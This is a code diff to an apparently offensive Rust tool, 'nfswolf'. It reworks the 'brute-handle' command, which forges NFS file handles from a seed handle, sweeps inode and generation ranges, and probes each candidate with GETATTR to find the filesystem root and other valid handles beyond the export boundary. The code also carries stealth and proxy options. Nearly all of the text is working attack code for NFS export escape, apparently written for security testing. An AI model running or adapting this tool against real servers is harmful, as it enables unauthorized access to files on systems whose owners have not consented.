@@ -48,7 +48,7 @@ use crate::util::stealth::StealthConfig;
 ///
 /// Examples:
 ///   nfswolf brute-handle 192.168.1.10:/srv
-///   nfswolf brute-handle 192.168.1.10 --seed-handle 01000200... --fs-type xfs
+///   nfswolf brute-handle 192.168.1.10 --seed-handle 01000200... --inode-start 64 --inode-end 256
 #[derive(Parser)]
 pub(crate) struct BruteHandleArgs {
     /// Target host with optional :/export (e.g. 10.0.0.5:/srv).
@@ -65,25 +65,24 @@ pub(crate) struct BruteHandleArgs {
     #[arg(long, value_name = "HEX", help_heading = H_TARGET)]
     pub seed_handle: Option<String>,
 
-    /// Filesystem type to guide candidate generation: auto (default), ext4, xfs, btrfs.
-    /// `auto` fingerprints the seed handle.
-    #[arg(long, default_value = "auto", value_name = "TYPE", help_heading = H_BEHAVIOR)]
-    pub fs_type: String,
-
-    /// Maximum number of handles to probe.
+    /// Maximum number of handles to probe (across the full inode x gen space).
     #[arg(long, default_value = "10000", value_name = "N", help_heading = H_BEHAVIOR)]
     pub max_attempts: u64,
 
-    /// Fix inode to this value and sweep generations instead of sweeping inodes.
-    /// Use when the STALE oracle confirms the inode exists but the generation is unknown.
-    #[arg(long, value_name = "INODE", help_heading = H_BEHAVIOR)]
-    pub fixed_inode: Option<u32>,
+    /// Start of the inode range (default: 0).
+    #[arg(long, default_value = "0", value_name = "INODE", help_heading = H_BEHAVIOR)]
+    pub inode_start: u64,
 
-    /// Generation range start (used with --fixed-inode).
+    /// End of the inode range, inclusive (default: 500).
+    #[arg(long, default_value = "500", value_name = "INODE", help_heading = H_BEHAVIOR)]
+    pub inode_end: u64,
+
+    /// Start of the generation range (default: 0).
     #[arg(long, default_value = "0", value_name = "GEN", help_heading = H_BEHAVIOR)]
     pub gen_start: u32,
 
-    /// Generation range end (used with --fixed-inode; 0 = use max_attempts from gen_start).
+    /// End of the generation range, inclusive (default: 0 = only gen 0).
+    /// The full search space is (inode_end - inode_start + 1) * (gen_end - gen_start + 1).
     #[arg(long, default_value = "0", value_name = "GEN", help_heading = H_BEHAVIOR)]
     pub gen_end: u32,
 }
@@ -112,34 +111,34 @@ pub(crate) async fn run(args: BruteHandleArgs, globals: &GlobalOpts) -> anyhow::
     // from format errors (STALE/BADHANDLE). Handles are bearer tokens.
     let (_, _, client) = make_client_with_hostname(addr, &pool_export, 0, 0, &[], stealth, globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
 
-    let fs = resolve_fs_type(&args.fs_type, &seed);
-    let mode = args.fixed_inode.map_or_else(|| format!("inode-sweep {fs:?}"), |i| format!("inode={i} gen-sweep"));
-    eprintln!("{}", crate::output::status_info(&format!("Brute-forcing handles on {host} [{mode}] (max {})", args.max_attempts)));
+    let fs = FileHandleAnalyzer::fingerprint_fs(&seed);
+    let inode_start = args.inode_start;
+    let inode_end = args.inode_end;
+    let gen_start = args.gen_start;
+    let gen_end = args.gen_end;
 
-    let found = if let Some(inode) = args.fixed_inode {
-        sweep_generations(&client, &seed, GenSweep { inode, gen_start: args.gen_start, gen_end: args.gen_end, max_attempts: args.max_attempts }, &host).await
-    } else if matches!(fs, FsType::Btrfs) {
+    let inode_count = inode_end.saturating_sub(inode_start) + 1;
+    let gen_count = u64::from(gen_end.saturating_sub(gen_start)) + 1;
+    let search_space = inode_count.saturating_mul(gen_count);
+
+    eprintln!("{}", crate::output::status_info(&format!(
+        "Brute-forcing handles on {host} [{fs:?}] inodes {inode_start}..={inode_end} x gen {gen_start}..={gen_end} ({search_space} candidates, max {})",
+        args.max_attempts
+    )));
+
+    let found = if matches!(fs, FsType::Btrfs) {
         sweep_btrfs(&client, &seed, args.max_attempts, &host).await
     } else {
-        sweep_inodes(&client, &seed, fs, args.max_attempts, &host).await
+        sweep_inodes(&client, &seed, fs, args.max_attempts, inode_start, inode_end, gen_start, gen_end, &host).await
     };
 
     if !found {
-        eprintln!("{}", crate::output::status_warn("No valid root found. If candidates returned STALE, try --fixed-inode 2 --gen-start 0 (sweep the root's generation), or pass --fs-type explicitly."));
+        eprintln!("{}", crate::output::status_warn("No valid handle found. Try widening --inode-start/--inode-end or --gen-start/--gen-end."));
     }
     crate::cli::emit_replay(globals);
     Ok(())
 }
 
-/// Resolve the filesystem type from the explicit flag, or fingerprint the seed.
-fn resolve_fs_type(flag: &str, seed: &FileHandle) -> FsType {
-    match flag {
-        "ext4" => FsType::Ext4,
-        "xfs" => FsType::Xfs,
-        "btrfs" => FsType::Btrfs,
-        _ => FileHandleAnalyzer::fingerprint_fs(seed),
-    }
-}
 
 /// Outcome of probing one candidate handle with GETATTR.
 enum Probe {
@@ -218,19 +217,23 @@ async fn report_hit(client: &Nfs3Client, candidate: &EscapeResult, note: &str, h
     println!();
 }
 
-/// Inode sweep: fingerprint-driven known roots first (parity with `escape`),
-/// then a generic inode sweep. Reports all valid handles found, not just the root.
-async fn sweep_inodes(client: &Nfs3Client, seed: &FileHandle, fs: FsType, max_attempts: u64, host: &str) -> bool {
+/// Full cross-product sweep: (inode_start..=inode_end) x (gen_start..=gen_end).
+///
+/// Phase 1 tries fingerprint-driven known root candidates (parity with `escape`).
+/// Phase 2 sweeps the user-specified inode x generation space. All valid handles
+/// are reported, not just the first root.
+#[expect(clippy::too_many_arguments, reason = "sweep parameters are all caller-controlled range bounds")]
+async fn sweep_inodes(client: &Nfs3Client, seed: &FileHandle, fs: FsType, max_attempts: u64, inode_start: u64, inode_end: u64, gen_start: u32, gen_end: u32, host: &str) -> bool {
     let mut found_root = false;
-    let mut extra_hits: Vec<(u64, String)> = Vec::new();
+    let mut extra_hits: Vec<(u64, u32, String)> = Vec::new();
 
-    // Phase 1: the same candidates escape tries (ext4 inode 2 / compound UUID,
-    // plus XFS 128/64/32 when the type is XFS or ambiguous).
+    // Phase 1: fingerprint-driven known root candidates (cheap, 3-5 probes).
     let mut known: Vec<EscapeResult> = FileHandleAnalyzer::construct_escape_handle(seed).into_iter().collect();
     if matches!(fs, FsType::Xfs | FsType::Unknown) {
         known.extend(FileHandleAnalyzer::construct_xfs_escape_candidates(seed));
     }
     let mut stale = 0u64;
+    let mut tried = 0u64;
     for cand in &known {
         match probe(client, &cand.root_handle).await {
             Probe::Dir => {
@@ -241,7 +244,7 @@ async fn sweep_inodes(client: &Nfs3Client, seed: &FileHandle, fs: FsType, max_at
                 report_hit(client, cand, "known root, access denied (root_squash)", host).await;
                 found_root = true;
             },
-            Probe::NonDir => extra_hits.push((u64::from(cand.inode_number), cand.root_handle.to_hex())),
+            Probe::NonDir => extra_hits.push((u64::from(cand.inode_number), 0, cand.root_handle.to_hex())),
             Probe::Stale => stale += 1,
             Probe::Miss => {},
         }
@@ -250,92 +253,51 @@ async fn sweep_inodes(client: &Nfs3Client, seed: &FileHandle, fs: FsType, max_at
         }
     }
 
-    // Phase 2: generic inode sweep from the fs-appropriate start inode, gen=0.
-    // Continue even after finding root to discover more valid handles.
-    let start = if matches!(fs, FsType::Xfs) { 64u64 } else { 2u64 };
-    let mut tried = 0u64;
-    for inode in start..start.saturating_add(max_attempts) {
+    // Phase 2: cross-product sweep over inode x generation.
+    'outer: for inode in inode_start..=inode_end {
         if tried >= max_attempts {
             break;
         }
         let inode32 = u32::try_from(inode).unwrap_or(u32::MAX);
-        let Some(cand) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode32, 0) else {
-            continue;
-        };
-        tried += 1;
-        match probe(client, &cand.root_handle).await {
-            Probe::Dir => {
-                if found_root {
-                    extra_hits.push((inode, cand.root_handle.to_hex()));
-                } else {
-                    report_hit(client, &cand, "found via scan", host).await;
-                    found_root = true;
-                }
-            },
-            Probe::Denied => {
-                if found_root {
-                    extra_hits.push((inode, cand.root_handle.to_hex()));
-                } else {
-                    report_hit(client, &cand, "found via scan (ACCES -- root_squash active)", host).await;
-                    found_root = true;
-                }
-            },
-            Probe::NonDir => extra_hits.push((inode, cand.root_handle.to_hex())),
-            Probe::Stale => stale += 1,
-            Probe::Miss => {},
-        }
-    }
-    if !extra_hits.is_empty() {
-        eprintln!("{}", crate::output::status_info(&format!("{} additional valid handle(s) discovered:", extra_hits.len())));
-        for (inode, hex) in &extra_hits {
-            eprintln!("    inode {inode:>6}  {hex}");
-        }
-    }
-    eprintln!("{}", crate::output::status_info(&format!("Swept {tried} inodes, {stale} STALE (format match, wrong inode/gen)")));
-    found_root
-}
-
-/// Parameters for a fixed-inode generation sweep (grouped to keep the arg count sane).
-struct GenSweep {
-    inode: u32,
-    gen_start: u32,
-    gen_end: u32,
-    max_attempts: u64,
-}
-
-/// Generation sweep for a fixed inode -- brute-handle's unique capability over
-/// `escape`, which only ever tries gen=0.
-async fn sweep_generations(client: &Nfs3Client, seed: &FileHandle, s: GenSweep, host: &str) -> bool {
-    let end = if s.gen_end > s.gen_start { s.gen_end } else { u32::try_from(u64::from(s.gen_start).saturating_add(s.max_attempts).min(u64::from(u32::MAX))).unwrap_or(u32::MAX) };
-    eprintln!("{}", crate::output::status_info(&format!("Sweeping gen {}..={end} for inode {}", s.gen_start, s.inode)));
-
-    let mut tried = 0u64;
-    let mut stale = 0u64;
-    let mut g = s.gen_start;
-    while g <= end && tried < s.max_attempts {
-        if let Some(cand) = FileHandleAnalyzer::construct_handle_for_inode(seed, s.inode, g) {
+        for generation in gen_start..=gen_end {
+            if tried >= max_attempts {
+                break 'outer;
+            }
+            let Some(cand) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode32, generation) else {
+                continue;
+            };
             tried += 1;
             match probe(client, &cand.root_handle).await {
                 Probe::Dir => {
-                    report_hit(client, &cand, &format!("inode {} gen {g}", s.inode), host).await;
-                    return true;
+                    if found_root {
+                        extra_hits.push((inode, generation, cand.root_handle.to_hex()));
+                    } else {
+                        report_hit(client, &cand, &format!("inode {inode} gen {generation}"), host).await;
+                        found_root = true;
+                    }
                 },
                 Probe::Denied => {
-                    report_hit(client, &cand, &format!("inode {} gen {g} (ACCES)", s.inode), host).await;
-                    return true;
+                    if found_root {
+                        extra_hits.push((inode, generation, cand.root_handle.to_hex()));
+                    } else {
+                        report_hit(client, &cand, &format!("inode {inode} gen {generation} (ACCES)"), host).await;
+                        found_root = true;
+                    }
                 },
-                Probe::NonDir => {
-                    report_hit(client, &cand, &format!("inode {} gen {g} (non-directory)", s.inode), host).await;
-                    return true;
-                },
+                Probe::NonDir => extra_hits.push((inode, generation, cand.root_handle.to_hex())),
                 Probe::Stale => stale += 1,
                 Probe::Miss => {},
             }
         }
-        g = g.saturating_add(1);
     }
-    eprintln!("{}", crate::output::status_info(&format!("Swept {tried} generations, {stale} STALE")));
-    false
+    if !extra_hits.is_empty() {
+        eprintln!("{}", crate::output::status_info(&format!("{} additional valid handle(s) discovered:", extra_hits.len())));
+        for (inode, generation, hex) in &extra_hits {
+            eprintln!("    inode {inode:>6}  gen {generation:>6}  {hex}");
+        }
+    }
+    eprintln!("{}", crate::output::status_info(&format!("Probed {tried} candidates, {stale} STALE")));
+    found_root
 }
 
 /// BTRFS subvolume sweep (subvol IDs 5 and 256+). Reports all discovered subvolumes.
